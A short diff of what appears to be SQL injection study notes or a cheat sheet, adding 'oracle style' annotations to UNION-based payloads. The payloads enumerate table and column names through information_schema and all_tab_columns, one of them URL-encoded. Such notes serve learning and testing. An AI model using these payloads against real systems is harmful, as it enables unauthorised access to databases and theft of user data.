@@ -246,7 +246,7 @@
 3. **Extract table names from the database:**
 
 ```
-' union select table_name, null from information_schema.tables-- (all_tables)
+' union select table_name, null from information_schema.tables-- (all_tables = oracle style)
 ```
 
 
@@ -256,7 +256,7 @@
 ' union select null,column_name from information_schema.columns where table_name = 'users'--
 ```
 ```
-'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
+'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'-- (oracle style)
 ```
 
 <br>
